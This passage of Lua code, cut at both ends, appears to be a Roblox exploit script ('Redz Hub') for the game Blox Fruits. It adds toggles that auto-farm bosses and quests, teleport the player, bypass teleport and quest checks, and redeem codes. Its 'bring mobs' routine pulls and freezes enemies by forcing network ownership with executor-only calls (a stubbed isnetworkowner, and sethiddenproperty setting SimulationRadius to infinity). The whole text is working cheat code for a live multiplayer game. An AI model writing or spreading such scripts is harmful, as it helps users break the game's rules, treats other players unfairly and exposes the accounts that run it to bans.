                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SickScientist", "Heal")
                                    end
                                end
                            elseif localPlayer.Character:FindFirstChild(localPlayer.Data.DevilFruit.Value) and localPlayer.Character:FindFirstChild(localPlayer.Data.DevilFruit.Value).Level.Value >= 400 then
                                tween(CFrame.new(-2812.76708984375, 254.803466796875, -12595.560546875))

                                if (CFrame.new(-2812.76708984375, 254.803466796875, -12595.560546875).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SickScientist", "Check")
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SickScientist", "Heal")
                                end
                            end
                        end
                    end)
                end
            end
        end)
    end

    if World2 or World3 then
        v20:AddSection("Aura Colours")

        v20:AddToggle({
            Name = "Teleport Barista Cousin",
            Default = GetSetting("Tp_MasterA", false),
            Callback = function(tpMasterA)
                _G.Tp_MasterA = tpMasterA
                _G.SaveData.Tp_MasterA = tpMasterA
                SaveSettings()
            end,
        })

        spawn(function()
            while wait() do
                if _G.Tp_MasterA then
                    pcall(function()
                        for k, child in pairs(ReplicatedStorage.NPCs:GetChildren()) do
                            if child.Name == "Barista Cousin" then
                                tween(child.HumanoidRootPart.CFrame)
                            end
                        end
                    end)
                end
            end
        end)

        v20:AddButton({
            Name = "Buy Aura Colors",
            Callback = function()
                ReplicatedStorage.Remotes.CommF_:InvokeServer("ColorsDealer", "2")
            end,
        })
    end

    if World3 then
        v20:AddToggle({
            Name = "Auto Rainbow Colors",
            Default = GetSetting("hakicv", false),
            Callback = function(hakicv)
                _G.hakicv = hakicv
                _G.SaveData.hakicv = hakicv
                SaveSettings()
            end,
        })

        spawn(function()
            pcall(function()
                local Stone, v30, vector, cframe, v31, v32, vector2, cframe2, v33, cframe3, n3
                n3 = 1

                while true do
                    if n3 == 1 then
                        if wait(Sec) then
                            n3 = 2
                        else
                            n3 = 35
                        end
                    elseif n3 == 2 then
                        if _G.hakicv then
                            n3 = 3
                        else
                            n3 = 1
                        end
                    elseif n3 == 3 then
                        if localPlayer.PlayerGui.Main.Quest.Visible == false then
                            n3 = 28
                        else
                            n3 = 4
                        end
                    elseif n3 == 4 then
                        if localPlayer.PlayerGui.Main.Quest.Visible == true and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Stone") then
                            n3 = 25
                        else
                            n3 = 5
                        end
                    elseif n3 == 5 then
                        if localPlayer.PlayerGui.Main.Quest.Visible == true and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Hydra Leader") then
                            n3 = 21
                        else
                            n3 = 6
                        end
                    elseif n3 == 6 then
                        if localPlayer.PlayerGui.Main.Quest.Visible == true and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Kilo Admiral") then
                            n3 = 18
                        else
                            n3 = 7
                        end
                    elseif n3 == 7 then
                        if localPlayer.PlayerGui.Main.Quest.Visible == true and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") then
                            n3 = 12
                        else
                            n3 = 8
                        end
                    elseif n3 == 8 then
                        if localPlayer.PlayerGui.Main.Quest.Visible == true and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Beautiful Pirate") then
                            n3 = 9
                        else
                            n3 = 1
                        end
                    elseif n3 == 9 then
                        v33 = MobCheck("Captain Elephant")

                        if v33 then
                            n3 = 10
                        else
                            n3 = 11
                        end
                    elseif n3 == 10 then
                        task.wait()
                        Kill(v33, _G.hakicv)

                        if _G.hakicv ~= false and v33.Humanoid.Health > 0 and v33.Parent and localPlayer.PlayerGui.Main.Quest.Visible ~= false then
                            n3 = 10
                        else
                            n3 = 1
                        end
                    elseif n3 == 11 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5314.54638671875, 22.562219619750977, -127.06755065917969))
                        n3 = 1
                    elseif n3 == 12 then
                        v32 = MobCheck("Captain Elephant")

                        if v32 then
                            n3 = 13
                        else
                            n3 = 14
                        end
                    elseif n3 == 13 then
                        task.wait()
                        Kill(v32, _G.hakicv)

                        if _G.hakicv ~= false and v32.Humanoid.Health > 0 and v32.Parent and localPlayer.PlayerGui.Main.Quest.Visible ~= false then
                            n3 = 13
                        else
                            n3 = 1
                        end
                    elseif n3 == 14 then
                        vector2 = Vector3.new(-12471.169921875, 374.94024658203, -7551.677734375)
                        cframe2 = CFrame.new(-13376.7578125, 433.28689575195, -8071.392578125)

                        if localPlayer.Character.HumanoidRootPart.CFrame.Position == vector2 then
                            n3 = 16
                        else
                            n3 = 15
                        end
                    elseif n3 == 15 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-12471.169921875, 374.94024658203, -7551.677734375))
                        n3 = 1
                    elseif n3 == 16 then
                        if localPlayer.Character.HumanoidRootPart.CFrame.Position == vector2 then
                            n3 = 17
                        else
                            n3 = 1
                        end
                    elseif n3 == 17 then
                        tween(cframe2)
                        n3 = 1
                    elseif n3 == 18 then
                        v31 = MobCheck("Kilo Admiral")

                        if v31 then
                            n3 = 19
                        else
                            n3 = 20
                        end
                    elseif n3 == 19 then
                        task.wait()
                        Kill(v31, _G.hakicv)

                        if _G.hakicv ~= false and v31.Humanoid.Health > 0 and v31.Parent and localPlayer.PlayerGui.Main.Quest.Visible ~= false then
                            n3 = 19
                        else
                            n3 = 1
                        end
                    elseif n3 == 20 then
                        tween(CFrame.new(2877.61743, 423.558685, -7207.31006, -0.989591599, -0.0, -0.143904909, -0.0, 1.00000012, -0.0, 0.143904924, 0, -0.989591479))
                        n3 = 1
                    elseif n3 == 21 then
                        v30 = MobCheck("Hydra Leader")

                        if v30 then
                            n3 = 22
                        else
                            n3 = 23
                        end
                    elseif n3 == 22 then
                        task.wait()
                        Kill(v30, _G.hakicv)

                        if _G.hakicv ~= false and v30.Humanoid.Health > 0 and v30.Parent and localPlayer.PlayerGui.Main.Quest.Visible ~= false then
                            n3 = 22
                        else
                            n3 = 1
                        end
                    elseif n3 == 23 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5643.45263671875, 1013.0858154296875, -340.51025390625))
                        vector = Vector3.new(5643.45263671875, 1013.0858154296875, -340.51025390625)
                        cframe = CFrame.new(5821.89794921875, 1019.0950927734375, -73.71923065185547)

                        if localPlayer.Character.HumanoidRootPart.CFrame.Position == vector then
                            n3 = 24
                        else
                            n3 = 1
                        end
                    elseif n3 == 24 then
                        tween(cframe)
                        n3 = 1
                    elseif n3 == 25 then
                        Stone = MobCheck("Stone")

                        if Stone then
                            n3 = 26
                        else
                            n3 = 27
                        end
                    elseif n3 == 26 then
                        wait()
                        Kill(Stone, _G.hakicv)

                        if _G.hakicv ~= false and Stone.Humanoid.Health > 0 and Stone.Parent and localPlayer.PlayerGui.Main.Quest.Visible ~= false then
                            n3 = 26
                        else
                            n3 = 1
                        end
                    elseif n3 == 27 then
                        tween(CFrame.new(-1086.11621, 38.8425903, 6768.71436, 0.0231462717, -0.592676699, 0.805107772, 2.03251839e-05, 0.805323839, 0.592835128, -0.999732077, -0.0137055516, 0.0186523199))
                        n3 = 1
                    elseif n3 == 28 then
                        if _G.GetQFast then
                            n3 = 29
                        else
                            n3 = 31
                        end
                    elseif n3 == 29 then
                        if localPlayer.PlayerGui.Main.Quest.Visible == false then
                            n3 = 30
                        else
                            n3 = 1
                        end
                    elseif n3 == 30 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("HornedMan", "Bet")
                        n3 = 1
                    elseif n3 == 31 then
                        cframe3 = CFrame.new(-11892.0703125, 930.57672119141, -8760.1591796875)
                        Rainbow1 = cframe3

                        if localPlayer.Character.HumanoidRootPart.CFrame == Rainbow1 then
                            n3 = 33
                        else
                            n3 = 32
                        end
                    elseif n3 == 32 then
                        tween(Rainbow1)
                        n3 = 1
                    elseif n3 == 33 then
                        if localPlayer.Character.HumanoidRootPart.CFrame == Rainbow1 then
                            n3 = 34
                        else
                            n3 = 1
                        end
                    elseif n3 == 34 then
                        wait(1)
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("HornedMan", "Bet")
                        n3 = 1
                    elseif n3 == 35 then
                        return
                    end
                end
            end)
        end)

        v20:AddToggle({
            Name = "Accept Rainbow Quest Fast",
            Default = GetSetting("GetQFast", false),
            Callback = function(getQFast)
                _G.GetQFast = getQFast
                _G.SaveData.GetQFast = getQFast
                SaveSettings()
            end,
        })
    end

    if World2 then
        v4:AddSection("Upgrade Races")

        v4:AddToggle({
            Name = "Auto Race V2",
            Default = GetSetting("Auto_RaceV2", false),
            Callback = function(autoRaceV2)
                _G.Auto_RaceV2 = autoRaceV2
                _G.SaveData.Auto_RaceV2 = autoRaceV2
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if not _G.Auto_RaceV2 then
                        return
                    end
                    local value = localPlayer.Data.Race.Value
                    if value:find("V2") or value:find("V3") then
                        return
                    end
                    local response = ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")

                    if response == 0 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "2")
                    elseif response == 1 then
                        if not localPlayer.Backpack:FindFirstChild("Flower 1") and not localPlayer.Character:FindFirstChild("Flower 1") then
                            tween(workspace.Flower1.CFrame)
                        elseif not localPlayer.Backpack:FindFirstChild("Flower 2") and not localPlayer.Character:FindFirstChild("Flower 2") then
                            tween(workspace.Flower2.CFrame)
                        elseif not localPlayer.Backpack:FindFirstChild("Flower 3") and not localPlayer.Character:FindFirstChild("Flower 3") then
                            local v30 = MobCheck("Swan Pirate")

                            if v30 then
                                repeat
                                    wait()
                                    Kill(v30, _G.Auto_RaceV2)
                                until localPlayer.Backpack:FindFirstChild("Flower 3") or not v30.Parent or v30.Humanoid.Health <= 0 or not _G.Auto_RaceV2
                            else
                                tween(CFrame.new(980, 121, 1287))
                            end
                        end
                    elseif response == 2 then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "3")
                    end
                end)
            end
        end)
    end

    local tbl15 = {
        {
            name = "Elite",
            check = function()
                local v30 = World3
                local stackElite = v30 and _G.StackElite

                if stackElite then
                    local Urban = MobCheck("Urban")
                    local Deandre = Urban or MobCheck("Deandre") or MobCheck("Diablo")
                    stackElite = Deandre ~= nil
                end

                return stackElite
            end,
        },
        {
            name = "DoughKing",
            check = function()
                if not World3 or not _G.StackDoughKing then
                    return false
                end
                local v30 = LayItems("Sweet Chalice")
                local v31 = v30 or LayItems("God's Chalice")
                local flag8 = MobCheck("Dough King") ~= nil
                local v32 = v31 or flag8
                return v32
            end,
        },
        {
            name = "PirateRaid",
            check = function()
                if not World3 or not _G.StackPirateRaid then
                    return false
                end
                local vector = Vector3.new(-5546.51, 313.8, -2966.33)

                for k, child in pairs(workspace.Enemies:GetChildren()) do
                    local humanoidRootPart2 = child:FindFirstChild("HumanoidRootPart")
                    if child:FindFirstChild("Humanoid") and child.Humanoid.Health > 0 and humanoidRootPart2 and (humanoidRootPart2.Position - vector).Magnitude <= 1000 then
                        return true
                    end
                end

                return false
            end,
        },
        {
            name = "Tyrant",
            check = function()
                local v30 = World3
                local flag8 = v30 and _G.StackTyrant and MobCheck("Tyrant of the Skies") ~= nil
                return flag8
            end,
        },
        {
            name = "RipIndra",
            check = function()
                local v30 = World3
                local stackRipIndra = v30 and _G.StackRipIndra

                if stackRipIndra then
                    local ripIndra = MobCheck("rip_indra")
                    local v31 = ripIndra or MobCheck("rip_indra True Form")
                    stackRipIndra = v31 ~= nil
                end

                return stackRipIndra
            end,
        },
        {
            name = "Factory",
            check = function()
                local v30 = World2
                local flag8 = v30 and _G.StackFactory and MobCheck("Core") ~= nil
                return flag8
            end,
        },
        {
            name = "Darkbeard",
            check = function()
                if not World2 or not _G.StackDarkbeard then
                    return false
                end
                local v30 = LayItems("Fist of Darkness")
                local flag8 = MobCheck("Darkbeard") ~= nil
                local v31 = v30 or flag8
                return v31
            end,
        },
        {
            name = "SoulReaper",
            check = function()
                if not World3 or not _G.StackSoulReaper then
                    return false
                end
                local v30 = LayItems("Hallow Essence")
                local flag8 = MobCheck("Soul Reaper") ~= nil
                local v31 = v30 or flag8
                return v31
            end,
        },
    }

    GetActiveStackTarget = function()
        for i, v30 in ipairs(tbl15) do
            if v30.check() then
                return v30.name
            end
        end

        return nil
    end

    ShouldPauseForStack = function()
        local flag8 = GetActiveStackTarget() ~= nil
        return flag8
    end

    HandleStackTarget = function()
        local v30, v31, Darkbeard, ripIndra, v32, v33, vector, v34, v35, v36, v37, v38, v39, humanoidRootPart2, Core, v40, response, tbl16, cframe, n3
        local n4, v41, n5
        n5 = 1

        while true do
            if n5 == 1 then
                v30 = GetActiveStackTarget()

                if v30 then
                    n5 = 2
                else
                    n5 = 46
                end
            elseif n5 == 2 then
                if v30 == "Elite" then
                    n5 = 39
                else
                    n5 = 3
                end
            elseif n5 == 3 then
                if v30 == "DoughKing" then
                    n5 = 31
                else
                    n5 = 4
                end
            elseif n5 == 4 then
                if v30 == "Factory" then
                    n5 = 29
                else
                    n5 = 5
                end
            elseif n5 == 5 then
                if v30 == "PirateRaid" then
                    n5 = 25
                else
                    n5 = 6
                end
            elseif n5 == 6 then
                if v30 == "Tyrant" then
                    n5 = 23
                else
                    n5 = 7
                end
            elseif n5 == 7 then
                if v30 == "RipIndra" then
                    n5 = 19
                else
                    n5 = 8
                end
            elseif n5 == 8 then
                if v30 == "Darkbeard" then
                    n5 = 15
                else
                    n5 = 9
                end
            elseif n5 == 9 then
                if v30 == "SoulReaper" then
                    n5 = 10
                else
                    n5 = 45
                end
            elseif n5 == 10 then
                v31 = MobCheck("Soul Reaper")

                if v31 and index.Alive(v31) then
                    n5 = 14
                else
                    n5 = 11
                end
            elseif n5 == 11 then
                if LayItems("Hallow Essence") then
                    n5 = 12
                else
                    n5 = 13
                end
            elseif n5 == 12 then
                EquipWeapon("Hallow Essence")
                tween(CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125))
                task.wait(1)
                n5 = 45
            elseif n5 == 13 then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                task.wait(0.3)
                n5 = 45
            elseif n5 == 14 then
                task.wait()
                Kill(v31, true)

                if index.Alive(v31) and GetActiveStackTarget() == "SoulReaper" then
                    n5 = 14
                else
                    n5 = 45
                end
            elseif n5 == 15 then
                Darkbeard = MobCheck("Darkbeard")

                if Darkbeard and index.Alive(Darkbeard) then
                    n5 = 18
                else
                    n5 = 16
                end
            elseif n5 == 16 then
                if LayItems("Fist of Darkness") then
                    n5 = 17
                else
                    n5 = 45
                end
            elseif n5 == 17 then
                tween(CFrame.new(3677.08203125, 62.751937866211, -3144.8332519531))
                task.wait(1)
                n5 = 45
            elseif n5 == 18 then
                task.wait()
                Kill(Darkbeard, true)

                if index.Alive(Darkbeard) and GetActiveStackTarget() == "Darkbeard" then
                    n5 = 18
                else
                    n5 = 45
                end
            elseif n5 == 19 then
                ripIndra = MobCheck("rip_indra")
                v32 = ripIndra

                if ripIndra then
                    n5 = 21
                else
                    n5 = 20
                end
            elseif n5 == 20 then
                v32 = MobCheck("rip_indra True Form")
                n5 = 21
            elseif n5 == 21 then
                if v32 and index.Alive(v32) then
                    n5 = 22
                else
                    n5 = 45
                end
            elseif n5 == 22 then
                task.wait()
                Kill(v32, true)

                if index.Alive(v32) and GetActiveStackTarget() == "RipIndra" then
                    n5 = 22
                else
                    n5 = 45
                end
            elseif n5 == 23 then
                v33 = MobCheck("Tyrant of the Skies")

                if v33 and index.Alive(v33) then
                    n5 = 24
                else
                    n5 = 45
                end
            elseif n5 == 24 then
                task.wait()
                Kill(v33, true)

                if index.Alive(v33) and GetActiveStackTarget() == "Tyrant" then
                    n5 = 24
                else
                    n5 = 45
                end
            elseif n5 == 25 then
                vector = Vector3.new(-5546.51, 313.8, -2966.33)
                v34, v35, v36 = pairs(workspace.Enemies:GetChildren())
                v37 = v36
                n5 = 26
            elseif n5 == 26 then
                v38, v39 = v34(v35, v37)

                if v38 == nil then
                    n5 = 45
                else
                    n5 = 27
                end
            elseif n5 == 27 then
                v37 = v38
                humanoidRootPart2 = v39:FindFirstChild("HumanoidRootPart")

                if v39:FindFirstChild("Humanoid") and v39.Humanoid.Health > 0 and humanoidRootPart2 and (humanoidRootPart2.Position - vector).Magnitude <= 1000 then
                    n5 = 28
                else
                    n5 = 26
                end
            elseif n5 == 28 then
                task.wait()
                Kill(v39, true)

                if index.Alive(v39) and GetActiveStackTarget() == "PirateRaid" then
                    n5 = 28
                else
                    n5 = 45
                end
            elseif n5 == 29 then
                Core = MobCheck("Core")

                if Core and index.Alive(Core) then
                    n5 = 30
                else
                    n5 = 45
                end
            elseif n5 == 30 then
                task.wait()
                tween(CFrame.new(448.47, 199.36, -441.39))
                EquipWeapon(_G.SelectWeapon)

                if index.Alive(Core) and GetActiveStackTarget() == "Factory" then
                    n5 = 30
                else
                    n5 = 45
                end
            elseif n5 == 31 then
                v40 = MobCheck("Dough King")

                if v40 and index.Alive(v40) then
                    n5 = 35
                else
                    n5 = 32
                end
            elseif n5 == 32 then
                if LayItems("Sweet Chalice") then
                    n5 = 33
                else
                    n5 = 45
                end
            elseif n5 == 33 then
                response = ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")

                if type(response) == "string" and string.find(response, "Do you want to open the portal now?") then
                    n5 = 34
                else
                    n5 = 45
                end
            elseif n5 == 34 then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")
                n5 = 45
            elseif n5 == 35 then
                task.wait()

                if not workspace._WorldOrigin:FindFirstChild("Ring") and not workspace._WorldOrigin:FindFirstChild("Fist") and not workspace._WorldOrigin:FindFirstChild("MochiSwirl") then
                    n5 = 37
                else
                    n5 = 36
                end
            elseif n5 == 36 then
                tween(v40.HumanoidRootPart.CFrame * CFrame.new(0, -40, 0))
                n5 = 38
            elseif n5 == 37 then
                tween(v40.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
                n5 = 38
            elseif n5 == 38 then
                Kill(v40, true)

                if index.Alive(v40) and GetActiveStackTarget() == "DoughKing" then
                    n5 = 35
                else
                    n5 = 45
                end
            elseif n5 == 39 then
                tbl16 = {"Diablo", "Urban", "Deandre"}
                cframe = CFrame.new(-5418.72754, 314.640106, -2821.67603)

                if localPlayer.PlayerGui.Main.Quest.Visible then
                    n5 = 43
                else
                    n5 = 40
                end
            elseif n5 == 40 then
                tween(cframe)
                n3 = 0
                n5 = 41
            elseif n5 == 41 then
                task.wait(0.2)
                n4 = n3 + 0.2
                n3 = n4

                if (localPlayer.Character.HumanoidRootPart.Position - cframe.Position).Magnitude >= 50 and n4 <= 8 then
                    n5 = 41
                else
                    n5 = 42
                end
            elseif n5 == 42 then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter")
                task.wait(0.5)
                n5 = 43
            elseif n5 == 43 then
                v41 = MobCheck(tbl16)

                if v41 and index.Alive(v41) then
                    n5 = 44
                else
                    n5 = 45
                end
            elseif n5 == 44 then
                task.wait()
                Kill(v41, true)

                if index.Alive(v41) and GetActiveStackTarget() == "Elite" then
                    n5 = 44
                else
                    n5 = 45
                end
            elseif n5 == 45 then
                return
            elseif n5 == 46 then
                return
            end
        end
    end

    task.spawn(function()
        while task.wait(0.1) do
            pcall(function()
                if ShouldPauseForStack() then
                    HandleStackTarget()
                end
            end)
        end
    end)

    v9:AddSection("Settings")

    v9:AddToggle({
        Name = "Auto Translate",
        Description = "Tu dong dich UI sang ngon ngu cua ban.",
        Default = _G.AutoTranslate,
        Callback = function(autoTranslate2)
            _G.AutoTranslate = autoTranslate2
            local v30 = FolderName
            local str = v30 or "Redz Hub - OK Hub"

            if writefile then
                if makefolder and not isfolder(str) then
                    makefolder(str)
                end

                local v31 = writefile
                local str2 = str .. "/AutoTranslate.txt"
                local str3 = autoTranslate2 and "true" or "false"
                v31(str2, str3)
            end
        end,
    })

    v9:AddDropdown({
        Name = "Farm Mode",
        Default = GetSetting("Mode", "Up"),
        Options = {"Up", "Orbit", "Star"},
        MultiSelect = false,
        Callback = function(mode)
            _G.Mode = mode
            _G.SaveData.Mode = mode
            SaveSettings()
        end,
    })

    v9:AddSlider({
        Name = "Farm Distance",
        Min = -30,
        Max = 30,
        Default = GetSetting("FarmDistance", 15),
        Increase = 1,
        Callback = function(farmDistance)
            _G.FarmDistance = farmDistance
            _G.SaveData.FarmDistance = farmDistance
            SaveSettings()
        end,
    })

    v9:AddSlider({
        Name = "Tween Speed",
        Min = 200,
        Max = 350,
        Default = GetSetting("TweenSpeed", 200),
        Increase = 1,
        Callback = function(tweenSpeed)
            _G.TweenSpeed = tweenSpeed
            _G.SaveData.TweenSpeed = tweenSpeed
            SaveSettings()
        end,
    })

    local tbl16 = {}

    local function fn29(arg, arg2, arg3)
        local position = arg.Position
        local position2 = arg2.Position
        arg.CFrame = CFrame.new(position + (position2 - position) * arg3, position2)
    end

    local function fn30(arg, arg2)
        arg.CFrame = CFrame.new(arg2)
    end

    local function fn31(arg, arg2)
        local n3 = 0

        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if child:FindFirstChild("Humanoid") and child:FindFirstChild("HumanoidRootPart") and child.Humanoid.Health > 0 then
                local magnitude = (child.HumanoidRootPart.Position - arg.Position).Magnitude
                local n4 = arg2 or 250

                if magnitude <= n4 then
                    n3 = n3 + 1
                end
            end
        end

        return n3
    end

    local function fn32(arg, arg2)
        local character3 = localPlayer.Character
        if not character3 or not character3:FindFirstChild("HumanoidRootPart") then
            return false
        end
        local magnitude = (character3.HumanoidRootPart.Position - arg.Position).Magnitude
        local n3 = arg2 or 290
        local flag8 = magnitude <= n3
        return flag8
    end

    if not isnetworkowner then
        isnetworkowner = function()
            return true
        end
    end

    local function fn33(arg)
        for k, v30 in pairs(tbl16) do
            local flag8

            if k then
                flag8 = false
            else
                flag8 = true
            end

            if not flag8 then
                if k.Parent then
                    flag8 = false
                else
                    flag8 = true
                end
            end

            if not flag8 then
                if k:FindFirstChild("Humanoid") then
                    flag8 = false
                else
                    flag8 = true
                end
            end

            if not flag8 then
                if k:FindFirstChild("HumanoidRootPart") then
                    flag8 = false
                else
                    flag8 = true
                end
            end

            if not flag8 then
                flag8 = k.Humanoid.Health <= 0
            end

            if not flag8 then
                flag8 = tick() - v30.LastUpdate > 2
            end

            if flag8 then
                tbl16[k] = nil
            end
        end

        if arg and fn31(arg) == 0 then
            tbl16 = {}
        end
    end

    spawn(function()
        game:GetService("RunService").RenderStepped:Connect(function()
            pcall(function()
                for k, v30 in pairs(tbl16) do
                    if k and k.Parent and k:FindFirstChild("HumanoidRootPart") and k.Humanoid.Health > 0 then
                        local now = tick()
                        local n3 = math.sin(now * v30.RockSpeedX + v30.FloatPhase) * 0.5
                        local n4 = math.cos(now * v30.RockSpeedZ + v30.FloatPhase) * 0.5
                        fn30(k.HumanoidRootPart, v30.Position + Vector3.new(n3, 0, n4))
                        v30.LastUpdate = now
                    else
                        tbl16[k] = nil
                    end
                end
            end)
        end)
    end)

    bringmob = function()
        if not CfMon then
            return
        end

        pcall(function()
            local character3 = localPlayer.Character
            if not character3 then
                return
            end

            if not character3:FindFirstChild("HumanoidRootPart") then
                return
            end
            local flag8 = typeof(CfMon) == "Vector3" and CfMon

            if not flag8 then
                local v30 = CfMon
            end

            local tbl17 = {}
            local vector = typeof(CfMon) == "Vector3" and CfMon or Vector3.new(CfMon.X, CfMon.Y, CfMon.Z)
            tbl17.Position = vector
            fn33(tbl17)
            local n3 = 0
            local maxMobBring = _G.MaxMobBring
            local n4 = maxMobBring or 4

            for k, child in pairs(workspace.Enemies:GetChildren()) do
                if n4 <= n3 then
                    break
                end
                local humanoidRootPart2 = child:FindFirstChild("HumanoidRootPart")
                local humanoid = child:FindFirstChild("Humanoid")
                local head = child:FindFirstChild("Head")

                if humanoidRootPart2 and humanoid and head and humanoid.Health > 0 and not humanoidRootPart2.Anchored and (not bossList2 or not table.find(bossList2, child.Name)) then
                    local magnitude = (humanoidRootPart2.Position - tbl17.Position).Magnitude
                    local bringDistance = _G.BringDistance
                    local n5 = bringDistance or 450

                    if n5 >= magnitude and fn32(tbl17) and isnetworkowner(humanoidRootPart2) then
                        n3 = n3 + 1
                        humanoidRootPart2.CanCollide = false
                        head.CanCollide = false
                        humanoidRootPart2.Size = Vector3.new(1, 1, 1)
                        humanoid.WalkSpeed = 0
                        humanoid.JumpPower = 0
                        humanoid:ChangeState(11)
                        humanoid.PlatformStand = true
                        local magnitude2 = (humanoidRootPart2.Position - tbl17.Position).Magnitude
                        local cframe = CFrame.new(tbl17.Position)

                        if tbl16[child] then
                            fn30(humanoidRootPart2, tbl17.Position)
                        else
                            fn29(humanoidRootPart2, cframe, 0.4)

                            if magnitude2 < 2 then
                                fn30(humanoidRootPart2, tbl17.Position)

                                local tbl18 = {
                                    Position = tbl17.Position,
                                    LastUpdate = tick(),
                                    RockSpeedX = math.random(1, 3) * 0.05,
                                    RockSpeedZ = math.random(1, 3) * 0.05,
                                    FloatPhase = math.random(0, math.floor(2 * math.pi)),
                                }

                                tbl16[child] = tbl18
                            end
                        end
                    end
                end
            end

            sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
        end)
    end

    v9:AddSlider({
        Name = "Bring Distance",
        Min = 50,
        Max = 1000,
        Default = GetSetting("BringDistance", 450),
        Increase = 1,
        Callback = function(bringDistance)
            _G.BringDistance = bringDistance
            _G.SaveData.BringDistance = bringDistance
            SaveSettings()
        end,
    })

    v9:AddSlider({
        Name = "Max Mob Bring",
        Min = 2,
        Max = 8,
        Default = GetSetting("MaxMobBring", 4),
        Increase = 1,
        Callback = function(maxMobBring)
            _G.MaxMobBring = maxMobBring
            _G.SaveData.MaxMobBring = maxMobBring
            SaveSettings()
        end,
    })

    _G.BringY = 0

    v9:AddToggle({
        Name = "Bring Mobs",
        Default = GetSetting("B", true),
        Callback = function(b)
            Bringgay = b
            _G.SaveData.B = b
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "Bypass TP",
        Description = "",
        Default = GetSetting("BypassCF", false),
        Callback = function(bypassCF)
            _G.BypassCF = bypassCF
            _G.SaveData.BypassCF = bypassCF
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "Auto Attack",
        Description = "",
        Default = GetSetting("FastAttack", true),
        Callback = function(fastV2)
            _G.FastV2 = fastV2
            _G.SaveData.FastAttack = fastV2
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "Auto M1 Fruit",
        Description = "",
        Default = GetSetting("M1BF", true),
        Callback = function(m1BF)
            _G.M1BF = m1BF
            _G.SaveData.M1BF = m1BF
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "x2 Speed If Have M1 - Not Eqiup Tool",
        Description = "",
        Default = GetSetting("Aura", true),
        Callback = function(aura)
            _G.Aura = aura
            _G.SaveData.Aura = aura
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "Auto Shoot [ BETA ]",
        Description = "",
        Default = GetSetting("Shoot", true),
        Callback = function(shoot)
            _G.Shoot = shoot
            _G.SaveData.Shoot = shoot
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "Auto Haki",
        Default = GetSetting("_G.TurnOnBuso", true),
        Callback = function(turnOnBuso)
            _G.TurnOnBuso = turnOnBuso
            _G.SaveData["_G.TurnOnBuso"] = turnOnBuso
            SaveSettings()
        end,
    })

    if World3 then
        v9:AddToggle({
            Name = "Auto Accept Quests",
            Description = "Bone and cake",
            Default = GetSetting("AcceptQuestC", false),
            Callback = function(acceptQuestC)
                _G.AcceptQuestC = acceptQuestC
                _G.SaveData.AcceptQuestC = acceptQuestC
                SaveSettings()
            end,
        })
    end

    v9:AddToggle({
        Name = "Bypass Quest",
        Default = GetSetting("RemoteQuest", false),
        Callback = function(remoteQuest)
            _G.RemoteQuest = remoteQuest
            _G.SaveData.RemoteQuest = remoteQuest
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "Take Quest Debounce",
        Description = "Wait 5 seconds to take the next mission",
        Default = GetSetting("DelayQuest", false),
        Callback = function(delayQuest)
            _G.DelayQuest = delayQuest
            _G.SaveData.DelayQuest = delayQuest
            SaveSettings()
        end,
    })

    v9:AddSection("Codes")

    v9:AddButton({
        Name = "Redeem all Codes",
        Callback = function()
            local redeem = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Redeem")
            task.wait(1)

            for i, v30 in ipairs({
                "LIGHTNINGABUSE",
                "fudd10",
                "fudd10_V2",
                "Chandler",
                "BIGNEWS",
                "KITT_RESET",
                "Sub2UncleKizaru",
                "SUB2GAMERROBOT_RESET1",
                "Sub2Fer999",
                "Enyu_is_Pro",
                "JCWK",
                "StarcodeHEO",
                "MagicBUS",
                "KittGaming",
                "Sub2CaptainMaui",
                "Sub2OfficialNoobie",
                "TheGreatAce",
                "Sub2NoobMaster123",
                "Sub2Daigrock",
                "Axiore",
                "StrawHatMaine",
                "TantaiGaming",
                "Bluxxy",
                "SUB2GAMERROBOT_EXP1",
                "NOMOREHACK",
                "BANEXPLOIT",
                "WildDares",
                "BossBuild",
                "GetPranked",
                "EARN_FRUITS",
                "FIGHT4FRUIT",
                "NOEXPLOITER",
                "NOOB2ADMIN",
                "CODESLIDE",
                "ADMINHACKED",
                "ADMINDARES",
                "fruitconcepts",
                "krazydares",
                "TRIPLEABUSE",
                "SEATROLLING",
                "24NOADMIN",
                "REWARDFUN",
                "NEWTROLL",
                "SECRET_ADMIN",
            }) do
                pcall(function()
                    redeem:InvokeServer(v30)
                end)

                task.wait(0.2)
            end
